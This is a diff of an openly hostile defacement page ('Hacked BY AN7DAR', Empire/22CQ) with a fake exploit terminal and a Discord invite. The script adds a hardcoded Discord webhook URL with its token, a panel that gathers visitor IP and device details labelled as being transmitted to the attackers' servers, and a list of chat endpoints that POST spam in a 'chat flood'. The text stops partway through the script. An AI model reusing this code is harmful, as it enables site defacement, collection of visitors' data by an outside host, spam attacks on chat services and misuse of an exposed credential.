@@ -1,9 +1,9 @@
-
-<html lang="ar" dir="rtl">
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>An7dar is here - advanced core</title>
+    <title>AN7DAR // EMPIRE // 22CQ</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@100;200;300;400;500;600;700;800&display=swap');
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
@@ -19,71 +19,106 @@
         }
 
         body {
-            background: #000;
             color: #fff;
             font-family: 'JetBrains Mono', monospace;
-            overflow-x: hidden;
+            overflow: hidden;
             min-height: 100vh;
             position: relative;
+            background: #000;
         }
 
-        /* Grid background */
-        body::before {
-            content: '';
+        .video-background {
             position: fixed;
-            top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            background-image:
-                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
-            background-size: 1.875rem 1.875rem;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -2;
+            overflow: hidden;
+        }
+
+        .video-background video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: brightness(0.3) contrast(1.2) saturate(1.3);
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(135deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.1) 100%);
             z-index: -1;
         }
 
-        /* Loading Screen */
-        .loading-screen {
+        .black-intro {
             position: fixed;
-            top: 0; left: 0;
-            width: 100vw; height: 100vh;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
             background: #000;
+            z-index: 10000;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
-            animation: fadeOut 0s ease-in-out 5s forwards;
+            padding: 2rem;
+            transition: opacity 1s ease-in-out;
         }
 
-        .glitch-text {
-            position: relative;
-            color: #fff;
-            font-size: 2.0rem;
-            font-family: 'Orbitron', monospace;
-            font-weight: 700;
-            text-align: center;
-            text-transform: uppercase;
-            letter-spacing: 0.19rem;
-            line-height: 1.6;
+        .intro-text {
+            color: #00ff41;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.3rem;
+            line-height: 2.2;
+            text-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
+            width: 100%;
+            max-width: 800px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
 
-        @keyframes fadeOut {
-            to {
-                opacity: 0;
-                visibility: hidden;
-            }
+        .intro-line {
+            margin: 0.3rem 0;
+            opacity: 0;
+            animation: fadeInLine 0.1s ease forwards;
         }
 
-        /* Main Content */
+        @keyframes fadeInLine {
+            to { opacity: 1; }
+        }
+
+        .cursor-intro {
+            display: inline-block;
+            width: 0.625rem;
+            height: 1.5rem;
+            background: #00ff41;
+            margin-left: 0.313rem;
+            animation: blink-intro 1s infinite;
+            vertical-align: middle;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.9);
+        }
+
+        @keyframes blink-intro {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
         .main-content {
             opacity: 0;
             animation: fadeIn 2s ease-in-out 0.5s forwards;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            justify-content: center;
+            justify-content: flex-start;
             align-items: center;
             position: relative;
-            padding: 2rem;
+            padding-top: 3vh;
+            padding-bottom: 2vh;
         }
 
         @keyframes fadeIn {
@@ -92,538 +127,589 @@
 
         .container {
             text-align: center;
-            max-width: 50rem;
-            padding: 2.5rem;
+            max-width: 45rem;
+            padding: 1rem;
+            margin: 0 auto;
             width: 100%;
         }
 
-        /* Avatar */
         .avatar-container {
-            margin-bottom: 2.5rem;
+            margin-bottom: 0.3rem;
             position: relative;
+            display: inline-block;
         }
 
         .avatar {
-            width: 31.25rem;
-            max-width: 90vw;
-            height: 18.75rem;
-            max-height: 54vw;
-            border: 0.188rem solid rgba(255,255,255,0.3);
-            box-shadow: 0 0 1.875rem rgba(255,255,255,0.2), inset 0 0 1.875rem rgba(255,255,255,0.1);
-            background: linear-gradient(135deg, #333, #111);
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            width: 14rem;
+            max-width: 40vw;
+            height: auto;
+            display: block;
             margin: 0 auto;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
+            border: none;
+            filter: drop-shadow(0 0 20px rgba(0, 255, 65, 0.4));
+            transition: all 0.4s ease;
         }
 
         .avatar:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 3.125rem rgba(255,255,255,0.4), inset 0 0 1.875rem rgba(255,255,255,0.2);
+            transform: scale(1.02);
+            filter: drop-shadow(0 0 40px rgba(0, 255, 65, 0.8));
         }
 
-        .avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        /* Title */
-        .An7dared-title {
+        .pwned-title {
             font-family: 'Orbitron', monospace;
-            font-size: 3.75rem;
+            font-size: 2.5rem;
             font-weight: 900;
-            letter-spacing: 0.1rem;
-            margin-bottom: 1.25rem;
-            background: linear-gradient(45deg, #fff, #888);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            letter-spacing: 0.2rem;
+            margin-bottom: 0.3rem;
+            color: #00ff41;
             text-transform: uppercase;
-            animation: glow 2s ease-in-out infinite alternate;
+            animation: glowGreen 2.5s ease-in-out infinite alternate;
+            text-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
         }
 
-        @keyframes glow {
-            from { filter: drop-shadow(0 0 1.25rem rgba(255,255,255,0.3)); }
-            to { filter: drop-shadow(0 0 2.5rem rgba(255,255,255,0.6)); }
+        @keyframes glowGreen {
+            from { text-shadow: 0 0 20px rgba(0, 255, 65, 0.4); }
+            to { text-shadow: 0 0 50px rgba(0, 255, 65, 0.9), 0 0 80px rgba(0, 255, 65, 0.4); }
         }
 
-        /* Terminal */
         .terminal-section {
-            background: rgba(0,0,0,0.8);
-            border: 0.063rem solid rgba(255,255,255,0.2);
-            border-radius: 0.625rem;
-            padding: 1.875rem;
-            margin-top: 2.5rem;
-            backdrop-filter: blur(0.625rem);
-            box-shadow: 0 0.625rem 1.875rem rgba(0,0,0,0.5);
+            margin: 0.5rem 0 1rem;
+            text-align: left;
+            border-left: 2px solid rgba(0, 255, 65, 0.6);
+            padding-left: 1rem;
         }
 
-        .terminal-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 1.25rem;
-            padding-bottom: 0.938rem;
-            border-bottom: 0.063rem solid rgba(255,255,255,0.1);
-        }
-
-        .terminal-dots {
-            display: flex;
-            gap: 0.5rem;
-            margin-right: 1.25rem;
-        }
-
-        .dot {
-            width: 0.75rem;
-            height: 0.75rem;
-            border-radius: 50%;
-            border: 0.063rem solid rgba(255,255,255,0.3);
-        }
-
-        .terminal-title {
-            font-family: 'Orbitron', monospace;
-            font-size: 1.375rem;
-            color: #fff;
-            letter-spacing: 0.1rem;
-        }
-
-        .command-line {
-            font-size: 1.5rem;
-            margin: 0.938rem 0;
+        .terminal-line {
+            font-size: 1rem;
+            margin: 0.2rem 0;
             opacity: 0;
             animation: typeIn 0.5s ease forwards;
-            display: flex;
-            align-items: center;
-            text-align: left;
+            color: rgba(255, 255, 255, 0.95);
+            text-shadow: 0 0 8px rgba(0, 255, 65, 0.3);
         }
 
-        .command-line:nth-child(2) { animation-delay: 2.5s; }
-        .command-line:nth-child(3) { animation-delay: 3s; }
-        .command-line:nth-child(4) { animation-delay: 3.5s; }
+        .terminal-line:nth-child(2) { animation-delay: 2.5s; }
+        .terminal-line:nth-child(3) { animation-delay: 3s; }
+        .terminal-line:nth-child(4) { animation-delay: 3.5s; }
 
         @keyframes typeIn {
             to { opacity: 1; }
         }
 
         .prompt {
-            color: rgba(255,255,255,0.5);
-            margin-left: 0.625rem;
-            margin-right: 0.313rem;
-        }
-
-        .command {
-            color: #fff;
-            font-weight: 500;
+            color: #00ff41;
+            margin-right: 0.5rem;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.6);
         }
 
         .success {
-            color: #4ade80;
+            color: #00ff41;
             font-weight: 600;
+            text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
         }
 
-        /* IP Section */
-        .ip-section {
-            margin-top: 1.875rem;
-            padding: 1.25rem;
-            background: rgba(0,0,0,0.8);
-            border: 0.063rem solid rgba(255,255,255,0.2);
-            border-radius: 0.625rem;
-            backdrop-filter: blur(0.625rem);
-            box-shadow: 0 0.625rem 1.875rem rgba(0,0,0,0.5);
-            text-align: center;
-            animation: fadeIn 1s ease-in-out 4s forwards;
-            opacity: 0;
-            position: relative;
-            overflow: hidden;
+        .highlight-22cq {
+            color: #ff3366;
+            font-weight: 700;
+            text-shadow: 0 0 20px rgba(255, 51, 102, 0.8);
         }
 
-        .ip-section::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 0.188rem;
-            background: linear-gradient(90deg, transparent, #4ade80, transparent);
-            animation: scanLine 2s linear infinite;
+        .ip-section-minimal {
+            margin: 0.8rem 0 1rem;
+            text-align: left;
+            width: 100%;
+            max-width: 520px;
+            margin-left: auto;
+            margin-right: auto;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 0.8rem 1.2rem;
+            border-radius: 0.5rem;
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            backdrop-filter: blur(4px);
         }
 
-        @keyframes scanLine {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        .ip-display {
-            font-size: 1.75rem;
-            color: #4ade80;
-            font-weight: bold;
-            letter-spacing: 0.063rem;
-            margin: 0.938rem 0;
+        .ip-section-title {
             font-family: 'Orbitron', monospace;
-            animation: pulseIp 2s ease-in-out infinite alternate;
-            text-shadow: 0 0 0.625rem rgba(74, 222, 128, 0.5);
-            padding: 0.625rem;
-            background: rgba(0,0,0,0.5);
-            border-radius: 0.313rem;
-            border: 0.063rem solid rgba(74, 222, 128, 0.3);
-        }
-
-        @keyframes pulseIp {
-            0% { text-shadow: 0 0 0.313rem rgba(74, 222, 128, 0.5); transform: scale(1); }
-            50% { text-shadow: 0 0 0.938rem rgba(74, 222, 128, 0.8); transform: scale(1.02); }
-            100% { text-shadow: 0 0 0.313rem rgba(74, 222, 128, 0.5); transform: scale(1); }
-        }
-
-        .ip-info {
-            font-size: 0.875rem;
-            color: rgba(255,255,255,0.5);
-            letter-spacing: 0.063rem;
+            font-size: 0.9rem;
+            color: #00ff41;
+            letter-spacing: 0.1rem;
             text-transform: uppercase;
-            margin-top: 0.625rem;
+            margin-bottom: 0.5rem;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+            padding-bottom: 0.2rem;
+            display: inline-block;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.4);
         }
 
-        .ip-stats {
+        .ip-info-minimal {
             display: flex;
-            justify-content: space-around;
-            margin-top: 1.25rem;
-            padding-top: 1.25rem;
-            border-top: 0.063rem solid rgba(255,255,255,0.1);
+            flex-direction: column;
+            gap: 0.2rem;
+            margin-bottom: 0.5rem;
         }
 
-        .stat-item {
-            text-align: center;
-        }
-
-        .stat-value {
-            font-size: 1.125rem;
-            color: #4ade80;
-            font-weight: bold;
-            font-family: 'Orbitron', monospace;
-        }
-
-        .stat-label {
+        .ip-info-row {
+            display: flex;
+            align-items: baseline;
+            gap: 0.5rem;
             font-size: 0.75rem;
-            color: rgba(255,255,255,0.5);
-            text-transform: uppercase;
-            margin-top: 0.313rem;
+            line-height: 1.3;
+            color: rgba(255, 255, 255, 0.9);
+            text-shadow: 0 0 5px rgba(0, 255, 65, 0.2);
+            border-bottom: 1px dotted rgba(0, 255, 65, 0.1);
+            padding-bottom: 0.15rem;
         }
 
-        /* Logging Animation */
-        .logging-animation {
+        .ip-label {
+            color: #00ff41;
+            font-weight: 600;
+            min-width: 3.5rem;
+            font-size: 0.7rem;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+
+        .ip-value {
+            color: rgba(255, 255, 255, 0.85);
+            font-weight: 400;
+            font-size: 0.7rem;
+            word-break: break-word;
+        }
+
+        .ip-value.ip-highlight {
+            color: #66d9ff;
+            font-family: 'Orbitron', monospace;
+            text-shadow: 0 0 15px rgba(102, 217, 255, 0.4);
+        }
+
+        .flood-minimal {
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-            margin: 1rem 0;
+            gap: 0.6rem;
+            margin: 0.4rem 0;
+            padding: 0.3rem 0.6rem;
+            background: rgba(255, 51, 102, 0.08);
+            border: 1px solid rgba(255, 51, 102, 0.2);
+            border-radius: 0.3rem;
+            flex-wrap: wrap;
         }
 
-        .log-dot {
-            width: 0.5rem;
-            height: 0.5rem;
-            background: #4ade80;
+        .flood-led-minimal {
+            width: 0.4rem;
+            height: 0.4rem;
+            background: #ff3366;
             border-radius: 50%;
-            animation: logPulse 1.5s ease-in-out infinite;
+            animation: floodBlink 0.3s infinite alternate;
+            box-shadow: 0 0 15px rgba(255, 51, 102, 0.8);
         }
 
-        .log-dot:nth-child(2) { animation-delay: 0.2s; }
-        .log-dot:nth-child(3) { animation-delay: 0.4s; }
-
-        @keyframes logPulse {
-            0%, 100% { opacity: 0.3; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1); }
+        @keyframes floodBlink {
+            0% { opacity: 0.2; transform: scale(0.7); }
+            100% { opacity: 1; transform: scale(1.3); }
         }
 
-        /* Status Indicator */
-        .status-indicator {
-            display: inline-flex;
+        .flood-text-minimal {
+            color: #ff6699;
+            font-size: 0.7rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(255, 51, 102, 0.4);
+        }
+
+        .flood-count-minimal {
+            font-family: 'Orbitron', monospace;
+            color: #ff3366;
+            font-size: 0.8rem;
+            font-weight: 900;
+            text-shadow: 0 0 20px rgba(255, 51, 102, 0.6);
+        }
+
+        .flood-endpoints-minimal {
+            display: flex;
+            gap: 0.3rem;
+            flex-wrap: wrap;
+            margin-left: auto;
+        }
+
+        .flood-endpoint-minimal {
+            color: rgba(255, 51, 102, 0.4);
+            font-size: 0.5rem;
+            font-family: 'Orbitron', monospace;
+            letter-spacing: 1px;
+        }
+
+        .error-message-minimal {
+            margin: 0.5rem 0;
+            color: #ff3366;
+            font-family: 'Orbitron', monospace;
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-align: center;
+            letter-spacing: 0.1rem;
+            text-transform: uppercase;
+            text-shadow: 0 0 20px rgba(255, 51, 102, 0.6);
+            animation: errorPulse 1.5s ease-in-out infinite;
+            border-top: 1px solid rgba(255, 51, 102, 0.15);
+            border-bottom: 1px solid rgba(255, 51, 102, 0.15);
+            padding: 0.3rem 0;
+        }
+
+        @keyframes errorPulse {
+            0%, 100% { opacity: 0.8; text-shadow: 0 0 20px rgba(255, 51, 102, 0.5); }
+            50% { opacity: 1; text-shadow: 0 0 40px rgba(255, 51, 102, 0.9); }
+        }
+
+        .status-minimal {
+            display: flex;
             align-items: center;
             gap: 0.5rem;
-            padding: 0.25rem 0.75rem;
-            background: rgba(0,0,0,0.5);
-            border-radius: 1rem;
-            margin-top: 0.5rem;
+            margin: 0.3rem 0;
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.7);
         }
 
-        .status-dot {
-            width: 0.5rem;
-            height: 0.5rem;
-            background: #4ade80;
+        .status-dot-minimal {
+            width: 0.25rem;
+            height: 0.25rem;
+            background: #00ff41;
             border-radius: 50%;
             animation: statusBlink 1s infinite;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.6);
         }
 
         @keyframes statusBlink {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            50% { opacity: 0.2; }
         }
 
-        /* Footer */
-        .footer-message {
-            margin-top: 2.5rem;
-            font-size: 0.875rem;
-            color: rgba(255,255,255,0.5);
-            letter-spacing: 0.125rem;
-            text-transform: uppercase;
+        .loading-minimal {
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+            margin: 0.3rem 0;
         }
 
-        /* Learn Box */
-        .learn-box {
-            position: absolute;
-            top: 2.975rem;
-            left: 1.875rem;
-            background: rgba(0, 0, 0, 0.6);
-            padding: 1.25rem;
-            border: 0.063rem solid rgba(255,255,255,0.2);
-            border-radius: 0.75rem;
-            backdrop-filter: blur(0.5rem);
-            z-index: 1000;
-            box-shadow: 0 0 1.25rem rgba(255,255,255,0.1);
+        .loading-dot-minimal {
+            width: 0.2rem;
+            height: 0.2rem;
+            background: #00ff41;
+            border-radius: 50%;
+            animation: loadingPulse 1.5s ease-in-out infinite;
+            box-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
         }
 
-        .learn-title {
-            font-family: 'Orbitron', monospace;
-            font-size: 0.875rem;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 0.75rem;
-            letter-spacing: 0.063rem;
-            text-transform: uppercase;
+        .loading-dot-minimal:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dot-minimal:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes loadingPulse {
+            0%, 100% { opacity: 0.2; transform: scale(0.7); }
+            50% { opacity: 1; transform: scale(1.2); }
         }
 
-        .learn-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 0.625rem;
-        }
-
-        .learn-item {
-            background: rgba(255, 255, 255, 0.05);
-            border: 0.063rem solid rgba(255,255,255,0.1);
-            padding: 0.625rem 0.938rem;
-            border-radius: 0.375rem;
-            font-size: 0.813rem;
-            color: #4ade80;
-            font-family: 'JetBrains Mono', monospace;
-            transition: all 0.3s ease;
-        }
-
-        .learn-item:hover {
-            background: rgba(255, 255, 255, 0.1);
-            color: #fff;
-            transform: translateX(0.313rem);
-        }
-
-        .learn-footer {
+        .learn-box-minimal {
+            margin: 0.5rem 0;
+            padding: 0.5rem 0.8rem;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 0.3rem;
             display: flex;
             align-items: center;
             justify-content: center;
-            transform: translateX(-0.313rem);
-            margin-top: 0.938rem;
-            padding-top: 0.625rem;
-            border-top: 0.063rem solid rgba(255,255,255,0.1);
-            gap: 0.625rem;
+            gap: 0.8rem;
+            flex-wrap: wrap;
         }
 
-        .discord-icon {
-            width: 1.25rem;
-            height: 1.25rem;
-            object-fit: contain;
-            opacity: 0.8;
+        .learn-badge-minimal {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.6rem;
+            letter-spacing: 2px;
+            font-family: 'Orbitron', monospace;
+            text-transform: uppercase;
         }
 
-        .discord-link {
-            font-size: 1rem;
-            color: #fff;
+        .discord-link-minimal {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.65rem;
+            letter-spacing: 1px;
+            text-decoration: none;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 1px;
+            transition: 0.3s ease;
             font-family: 'JetBrains Mono', monospace;
-            letter-spacing: 0.063rem;
-            opacity: 0.8;
         }
 
-        /* Responsive */
+        .discord-link-minimal:hover {
+            color: #00ff41;
+            border-color: #00ff41;
+            text-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+
+        .footer-message {
+            margin-top: 0.5rem;
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.3);
+            letter-spacing: 0.15rem;
+            text-transform: uppercase;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding-top: 0.5rem;
+        }
+
         @media (max-width: 768px) {
-            .An7dared-title { font-size: 2rem; }
-            .container { padding: 1.25rem; }
-            .learn-box { position: relative; top: auto; left: auto; margin-bottom: 2rem; }
+            .pwned-title { font-size: 1.8rem; }
+            .avatar { width: 10rem; }
+            .container { padding: 0.5rem; }
+            .ip-info-row { font-size: 0.65rem; }
+            .intro-text { font-size: 1rem; }
+            .ip-section-minimal { padding: 0.5rem 0.8rem; }
+        }
+
+        @media (max-width: 480px) {
+            .pwned-title { font-size: 1.3rem; letter-spacing: 0.1rem; }
+            .avatar { width: 7rem; }
+            .terminal-line { font-size: 0.75rem; }
+            .ip-section-title { font-size: 0.7rem; }
+            .flood-endpoints-minimal { display: none; }
         }
     </style>
 </head>
 <body>
 
-<audio id="bg-music" autoplay loop>
+<!-- Video Background -->
+<div class="video-background">
+    <video autoplay loop muted playsinline>
+        <source src="https://files.catbox.moe/g8z9d3.mp4" type="video/mp4">
+    </video>
+</div>
+<div class="overlay"></div>
+
+<!-- Audio -->
+<audio id="bg-music" loop>
     <source src="https://files.catbox.moe/8fzwgj.mp3" type="audio/mpeg">
 </audio>
 
-<!-- Loading Screen -->
-<div class="loading-screen">
-    <div class="loading-text glitch-text" data-text="Security Alert An7dar in the system ..">
-   Hello Everyone 22CQ is Here Stay Tuned,  ..<br> Empire was here 
-    </div>
+<audio id="type-sound" preload="auto">
+    <source src="https://files.catbox.moe/gm3v2w.mp3" type="audio/mpeg">
+</audio>
+
+<!-- Black Intro Screen -->
+<div class="black-intro" id="blackIntro">
+    <div class="intro-text" id="introText"></div>
+    <span class="cursor-intro"></span>
 </div>
 
 <!-- Main Content -->
 <div class="main-content">
     <div class="container">
+        <!-- Avatar -->
         <div class="avatar-container">
-            <div class="avatar">
-                <img src="https://i.ibb.co/8nH61S6j/6421779-0463913033-tumbl.gif" alt="avatar" />
-            </div>
+            <img src="https://i.ibb.co/8nH61S6j/6421779-0463913033-tumbl.gif" alt="AN7DAR" class="avatar" />
         </div>
 
-        <h1 class="An7dared-title">Hacked BY An7dar </h1>
+        <h1 class="pwned-title">⚡ Hacked BY AN7DAR ⚡</h1>
 
+        <!-- Terminal -->
         <div class="terminal-section">
-            <div class="terminal-header">
-                <div class="terminal-dots">
-                    <div class="dot"></div>
-                    <div class="dot"></div>
-                    <div class="dot"></div>
-                </div>
-                <div class="terminal-title">Discord.gg/PT5MspcQvG/</div>
+            <div class="terminal-line">
+                <span class="prompt">❯</span>
+                <span>root@an7dar:~$ whoami</span>
             </div>
-
-            <div class="command-line">
-                <span class="prompt">server@system:~$</span>
-                <span class="command">whoami</span>
+            <div class="terminal-line">
+                <span class="success">❯ AN7DAR // 22CQ // EMPIRE</span>
             </div>
-
-            <div class="command-line">
-                <span class="success">An7dar : United We Command (:</span>
+            <div class="terminal-line">
+                <span class="prompt">❯</span>
+                <span>root@an7dar:~$ ./exploit --target=ALL</span>
             </div>
-            
-            <div class="command-line">
-                <span class="prompt">system:~$</span>
-                <span class="command">chat flood activated</span>
+            <div class="terminal-line">
+                <span class="highlight-22cq">❯ [!!!] SYSTEM COMPROMISED // FLOOD ACTIVE</span>
             </div>
         </div>
 
-        <!-- IP Section -->
-        <div class="ip-section">
-            <div class="terminal-header">
-                <div class="terminal-dots">
-                    <div class="dot"></div>
-                    <div class="dot"></div>
-                    <div class="dot"></div>
-                </div>
-                <div class="terminal-title"> Empire </div>
+        <!-- IP SECTION -->
+        <div class="ip-section-minimal" id="ipSectionMinimal">
+            <div class="ip-section-title">⌗ target intelligence</div>
+            
+            <div class="loading-minimal" id="loadingMinimal">
+                <div class="loading-dot-minimal"></div>
+                <div class="loading-dot-minimal"></div>
+                <div class="loading-dot-minimal"></div>
+                <span style="color: rgba(0,255,65,0.7); font-size: 0.6rem; margin-left: 0.3rem; text-shadow: 0 0 5px rgba(0,255,65,0.3);">collecting intel...</span>
             </div>
             
-            <div class="logging-animation">
-                <div class="log-dot"></div>
-                <div class="log-dot"></div>
-                <div class="log-dot"></div>
+            <div class="ip-info-minimal" id="ipInfoMinimal">
+                <div class="ip-info-row">
+                    <span class="ip-label">IP:</span>
+                    <span class="ip-value ip-highlight" id="ipAddressValue">scanning...</span>
+                </div>
+                <div class="ip-info-row">
+                    <span class="ip-label">Browser:</span>
+                    <span class="ip-value" id="browserValue">-</span>
+                </div>
+                <div class="ip-info-row">
+                    <span class="ip-label">OS:</span>
+                    <span class="ip-value" id="osValue">-</span>
+                </div>
+                <div class="ip-info-row">
+                    <span class="ip-label">Screen:</span>
+                    <span class="ip-value" id="screenValue">-</span>
+                </div>
+                <div class="ip-info-row">
+                    <span class="ip-label">Cores:</span>
+                    <span class="ip-value" id="coresValue">-</span>
+                </div>
+                <div class="ip-info-row">
+                    <span class="ip-label">RAM:</span>
+                    <span class="ip-value" id="ramValue">-</span>
+                </div>
+            </div>
+
+            <!-- Flood Status -->
+            <div class="flood-minimal">
+                <span class="flood-led-minimal"></span>
+                <span class="flood-text-minimal">🔥 CHAT FLOOD</span>
+                <span class="flood-count-minimal" id="floodCount">0</span>
+                <span style="color: rgba(255,51,102,0.3); font-size: 0.5rem;">pkt/s</span>
+                <div class="flood-endpoints-minimal">
+                    <span class="flood-endpoint-minimal">flix</span>
+                    <span class="flood-endpoint-minimal">danger</span>
+                    <span class="flood-endpoint-minimal">easy</span>
+                    <span class="flood-endpoint-minimal">melox</span>
+                    <span class="flood-endpoint-minimal">ho</span>
+                </div>
             </div>
             
-            <div id="ipDisplay" class="ip-display">discord.gg.empire</div>
-            
-            <div class="status-indicator">
-                <div class="status-dot"></div>
-                <span id="statusText" style="font-size: 0.75rem; color: #4ade80;">جاري الإرسال إلى سيرفرات An7dar...</span>
+            <div class="error-message-minimal" id="errorMessage">
+                ⚠ target server compromised ⚠
             </div>
             
-            <div class="ip-info">IP Address Successfully Captured</div>
-            
-            <div class="ip-stats">
-                <div class="stat-item">
-                    <div class="stat-value" id="userAgentShort">-</div>
-                    <div class="stat-label">المتصفح</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-value" id="screenSize">-</div>
-                    <div class="stat-label">الدقة</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-value" id="connectionStatus">-</div>
-                    <div class="stat-label">الاتصال</div>
-                </div>
+            <div class="status-minimal" id="statusMinimal">
+                <div class="status-dot-minimal"></div>
+                <span id="statusTextMinimal" style="color: rgba(255,255,255,0.7); text-shadow: 0 0 8px rgba(0,255,65,0.3);">transmitting to AN7DAR servers...</span>
             </div>
         </div>
 
-        <div class="footer-message">Officaly Discord.gg/PT5MspcQvG • Empire .</div>
-
-        <div class="learn-box">
-            <div class="learn-title">You Got An7dared By Empire :</div>
-            <div class="learn-grid">
-                <div class="learn-item">.An7dar</div>
-                <div class="learn-footer">
-                    <img src="https://i.ibb.co/HLD6j14t/discord-ezgif-com-webp-to-png-converter.png" alt="Discord" class="discord-icon" />
-                    <span class="discord-link">Discord.gg/PT5MspcQvG</span>
-                </div>
-            </div>
+        <!-- Discord / Learn -->
+        <div class="learn-box-minimal">
+            <span class="learn-badge-minimal">#AN7DAR</span>
+            <span class="learn-badge-minimal">#22CQ</span>
+            <span class="learn-badge-minimal">#EMPIRE</span>
+            <a href="#" class="discord-link-minimal">▶ Discord.gg/PT5MspcQvG</a>
         </div>
+
+        <div class="footer-message">◈ EMPIRE // AN7DAR // 22CQ ◈</div>
     </div>
 </div>
 
 <script>
-    // Preload effect
-    window.addEventListener('load', function () {
-        setTimeout(() => {
-            document.querySelector('.loading-screen').style.display = 'none';
-        }, 5000);
-    });
-
-    // Subtle screen flicker
-    setInterval(() => {
-        if (Math.random() < 0.50) {
-            document.body.style.filter = 'brightness(1.2)';
-            setTimeout(() => {
-                document.body.style.filter = 'brightness(1)';
-            }, 50);
-        }
-    }, 2000);
-
-    // Avatar hover effect
-    window.addEventListener('load', () => {
-        const avatar = document.querySelector('.avatar');
-        setTimeout(() => {
-            avatar.classList.add('force-hover');
-            setTimeout(() => {
-                avatar.classList.remove('force-hover');
-            }, 3000);
-        }, 5000);
-    });
-
-    // Learn items sequential effect
-    window.addEventListener('load', () => {
-        const items = document.querySelectorAll('.learn-item');
-        let index = 0;
-        function applyEffectSequentially() {
-            if (index >= items.length) index = 0;
-            const item = items[index];
-            item.classList.add('force-hover');
-            setTimeout(() => {
-                item.classList.remove('force-hover');
-                index++;
-                setTimeout(applyEffectSequentially, 1500); 
-            }, 1000); 
-        }
-        setTimeout(applyEffectSequentially, 6000);
-    });
-
-    // ---------- SHADOW CORE INTEGRATION ----------
-    // Discord Webhook
-    const DISCORD_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1476278524099825734/r3vRYA37_fdbtr8eI1z1jceZj5Egyr8wW3eFtQQjWlNUxPe8CM0MVLjPn_E_0iBnnRDg';
-
-    // الزومبي msg ثابت
-    const msg = `An7dar - dis.gg/empire`;
-    
-    // قائمة endpoints للـ chat flood
-    const chatEndpoints = [
-        { url: "https://Flix-Scripts/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
-        { url: "https://danger_chat/Danger_Chat:SendMessage", method: "POST", body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]}) },
-        { url: "https://easy-chat+/o6ZbK5Ecp6", method: "POST", headers: {"accept": "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, body: JSON.stringify({ message: msg, channel: "شات العام" }) },
-        { url: "https://Melox_Chat/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
-        { url: "https://Melix_Chat/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
-        { url: "https://AS_Chat/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
-        { url: "https://chat/chatResult", method: "POST", body: JSON.stringify({ message: msg }) },
-        { url: "https://ho-chatv2/Chat", method: "POST", body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"}) }
+    // ============================================================
+    // INTRO TYPING
+    // ============================================================
+    const introLines = [
+        "[+] Initializing AN7DAR core ...",
+        "[+] Empire is here .",
+        "[+] Target server detected .",
+        "[+] Exploiting vulnerabilities ...",
